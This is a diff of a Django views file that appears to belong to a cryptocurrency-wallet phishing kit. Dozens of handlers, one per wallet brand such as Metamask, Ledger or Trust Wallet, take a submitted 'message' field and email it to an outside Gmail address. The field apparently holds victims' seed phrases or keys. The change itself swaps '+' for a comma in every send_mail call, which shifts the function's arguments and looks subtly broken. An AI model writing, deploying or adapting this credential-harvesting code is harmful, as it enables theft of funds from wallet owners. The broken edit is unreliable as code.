@@ -24,7 +24,7 @@ def input(request):
 		
 		send_mail(
             'Bitcoin',
-            'Metamask wallet : ' + data['message'],
+            'Metamask wallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -46,7 +46,7 @@ def coinbase(request):
 		
 		send_mail(
             'Bitcoin',
-            'coinbase wallet : ' + data['message'],
+            'coinbase wallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -68,7 +68,7 @@ def alphawallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'alphawallet : ' + data['message'],
+            'alphawallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -90,7 +90,7 @@ def argentwallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'argentwallet : ' + data['message'],
+            'argentwallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -111,7 +111,7 @@ def metamask(request):
 		
 		send_mail(
             'Bitcoin',
-            'metamask : ' + data['message'],
+            'metamask : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -132,7 +132,7 @@ def trustwallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'trustwallet : ' + data['message'],
+            'trustwallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -153,7 +153,7 @@ def coin98(request):
 		
 		send_mail(
             'Bitcoin',
-            'coin98 : ' + data['message'],
+            'coin98 : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -173,7 +173,7 @@ def coinomi(request):
 		
 		send_mail(
             'Bitcoin',
-            'coinomi : ' + data['message'],
+            'coinomi : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -193,7 +193,7 @@ def crypto(request):
 		
 		send_mail(
             'Bitcoin',
-            'crypto : ' + data['message'],
+            'crypto : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -214,7 +214,7 @@ def eidoo(request):
 		
 		send_mail(
             'Bitcoin',
-            'eidoo : ' + data['message'],
+            'eidoo : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -235,7 +235,7 @@ def exodus(request):
 		
 		send_mail(
             'Bitcoin',
-            'exodus : ' + data['message'],
+            'exodus : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -256,7 +256,7 @@ def gridplus(request):
 		
 		send_mail(
             'Bitcoin',
-            'gridplus : ' + data['message'],
+            'gridplus : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -276,7 +276,7 @@ def huobi(request):
 		
 		send_mail(
             'Bitcoin',
-            'huobi : ' + data['message'],
+            'huobi : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -297,7 +297,7 @@ def imtoken(request):
 		
 		send_mail(
             'Bitcoin',
-            'imtoken : ' + data['message'],
+            'imtoken : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -318,7 +318,7 @@ def infinitowallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'infinitowallet : ' + data['message'],
+            'infinitowallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -339,7 +339,7 @@ def infinity(request):
 		
 		send_mail(
             'Bitcoin',
-            'infinity : ' + data['message'],
+            'infinity : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -361,7 +361,7 @@ def ledger(request):
 		
 		send_mail(
             'Bitcoin',
-            'ledger wallet: ' + data['message'],
+            'ledger wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -383,7 +383,7 @@ def mathwallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'math wallet: ' + data['message'],
+            'math wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -403,7 +403,7 @@ def atomic(request):
 		
 		send_mail(
             'Bitcoin',
-            'atomic: ' + data['message'],
+            'atomic: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -424,7 +424,7 @@ def mew(request):
 		
 		send_mail(
             'Bitcoin',
-            'mew: ' + data['message'],
+            'mew: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -444,7 +444,7 @@ def midas(request):
 		
 		send_mail(
             'Bitcoin',
-            'midas: ' + data['message'],
+            'midas: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -465,7 +465,7 @@ def moriX(request):
 		
 		send_mail(
             'Bitcoin',
-            'moriX: ' + data['message'],
+            'moriX: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -485,7 +485,7 @@ def mykey(request):
 		
 		send_mail(
             'Bitcoin',
-            'mykey: ' + data['message'],
+            'mykey: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -506,7 +506,7 @@ def nash(request):
 		
 		send_mail(
             'Bitcoin',
-            'nash: ' + data['message'],
+            'nash: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -527,7 +527,7 @@ def onto(request):
 		
 		send_mail(
             'Bitcoin',
-            'onto: ' + data['message'],
+            'onto: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -549,7 +549,7 @@ def ownbit(request):
 		
 		send_mail(
             'Bitcoin',
-            'ownbit: ' + data['message'],
+            'ownbit: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -570,7 +570,7 @@ def peakdefi(request):
 		
 		send_mail(
             'Bitcoin',
-            'peakdefi: ' + data['message'],
+            'peakdefi: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -591,7 +591,7 @@ def pillar(request):
 		
 		send_mail(
             'Bitcoin',
-            'pillar: ' + data['message'],
+            'pillar: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -612,7 +612,7 @@ def rainbow(request):
 		
 		send_mail(
             'Bitcoin',
-            'rainbow: ' + data['message'],
+            'rainbow: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -633,7 +633,7 @@ def safepal(request):
 		
 		send_mail(
             'Bitcoin',
-            'safepal wallet: ' + data['message'],
+            'safepal wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -654,7 +654,7 @@ def safepal(request):
 		
 		send_mail(
             'Bitcoin',
-            'safepal wallet: ' + data['message'],
+            'safepal wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -676,7 +676,7 @@ def sparkpoint(request):
 		
 		send_mail(
             'Bitcoin',
-            'spark point wallet: ' + data['message'],
+            'spark point wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -698,7 +698,7 @@ def spatium(request):
 		
 		send_mail(
             'Bitcoin',
-            'spatium wallet: ' + data['message'],
+            'spatium wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -720,7 +720,7 @@ def swft(request):
 		
 		send_mail(
             'Bitcoin',
-            'swft wallet: ' + data['message'],
+            'swft wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -742,7 +742,7 @@ def tokenpocket(request):
 		
 		send_mail(
             'Bitcoin',
-            'token pocket wallet: ' + data['message'],
+            'token pocket wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -764,7 +764,7 @@ def tokenpockett(request):
 		
 		send_mail(
             'Bitcoin',
-            'token pocket wallet 2: ' + data['message'],
+            'token pocket wallet 2: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -785,7 +785,7 @@ def tronlink(request):
 		
 		send_mail(
             'Bitcoin',
-            'tronlink: ' + data['message'],
+            'tronlink: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -807,7 +807,7 @@ def atwallet(request):
 		
 		send_mail(
             'Bitcoin',
-            'atwallet: ' + data['message'],
+            'atwallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -828,7 +828,7 @@ def unstoppable(request):
 		
 		send_mail(
             'Bitcoin',
-            'unstoppable wallet: ' + data['message'],
+            'unstoppable wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -849,7 +849,7 @@ def vision(request):
 		
 		send_mail(
             'Bitcoin',
-            'vision wallet: ' + data['message'],
+            'vision wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -870,7 +870,7 @@ def walleth(request):
 		
 		send_mail(
             'Bitcoin',
-            'walleth: ' + data['message'],
+            'walleth: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -891,7 +891,7 @@ def walletio(request):
 		
 		send_mail(
             'Bitcoin',
-            'walleth IO: ' + data['message'],
+            'walleth IO: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -912,7 +912,7 @@ def xdc(request):
 		
 		send_mail(
             'Bitcoin',
-            'XDC wallet: ' + data['message'],
+            'XDC wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
@@ -933,7 +933,7 @@ def zelcore(request):
 		
 		send_mail(
             'Bitcoin',
-            'zelcore wallet: ' + data['message'],
+            'zelcore wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
             fail_silently=False,
